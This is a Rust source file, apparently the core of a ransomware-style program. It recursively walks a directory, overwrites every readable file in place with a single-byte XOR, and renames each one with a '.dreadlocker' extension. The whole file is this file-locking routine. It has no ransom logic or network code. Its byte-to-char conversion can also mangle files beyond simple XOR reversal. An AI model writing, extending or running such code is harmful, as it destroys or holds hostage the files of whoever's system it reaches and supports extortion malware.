use std::fs::{self, OpenOptions};
use std::io::{Read, Write, SeekFrom, Seek};
use std::path::PathBuf;
use std::process;
pub fn encrypt_dir(path: &str, encryption_type: u8) {
    let file_list = fs::read_dir(path).unwrap_or_else(|err| {
        eprintln!("Error reading {}'s content: {}",path, err);
        process::exit(1);
    });
    for file in file_list {
        let path = file.as_ref().unwrap().path();
        if let Ok(metadata) = path.metadata() {
            match metadata.is_file() {
                true => {
                    println!("Encrypting '{}'", path.display());
                    encrypt_file(file.unwrap().path(), encryption_type);
                },
                false => {
                    println!("'{}' is a folder, encrypting...", path.display());
                    encrypt_dir(&path.into_os_string().into_string().unwrap(), encryption_type);
                    
                }
            }
        }
        
    }
}

pub fn encrypt_file(file_path: PathBuf, encryption_type: u8) {
    let mut file = OpenOptions::new()
    .read(true)
    .write(true)
    .create(true)
    .open(file_path.clone()).unwrap_or_else(|err| {
        eprintln!("Error opening {} : {}", file_path.display(), err);
        process::exit(1);
    });
    let mut contents = String::new();
    let reading_done = file.read_to_string(&mut contents);
    if reading_done.is_err() {
        eprintln!("Error reading {} : {}",file_path.as_path().as_os_str().to_str().unwrap(), reading_done.unwrap());
    }
    else {
        //println!("Content before encryption: {}", contents);
        match encryption_type {
            1 => { // TODO: other encryption type
                println!("Type 1 encryption is not yet implemented. Exiting...");
                process::exit(0);
            },
            _ => { // 0 or anything else => simple XOR
                rename_file(&file_path);
                let xor_number: u8 = 5;
                let mut result: String = String::new();
                for i in contents.as_bytes().iter(){
                    let value = *i^xor_number;
                    // println!("Value : {} towards {}", i, value);
                    result.push(char::from(value));
                }
                file.seek(SeekFrom::Start(0)).unwrap();
                file.write_all(result.as_bytes()).unwrap_or_else(|err| {
                    eprintln!("Error overwriting {}: {}. Sufficient permissions?",&file_path.display(), err);
                });
            }
        }
    }
    
}

fn rename_file(file_path: &PathBuf) {
    let name = file_path.as_path().as_os_str().to_str().unwrap();
    let mut new_name = String::from(name);
    new_name.push_str(".dreadlocker");
    fs::rename(name,new_name).unwrap_or_else(|err| {
        eprintln!("Error appending the extension to {}: {}", name, err);
    });
}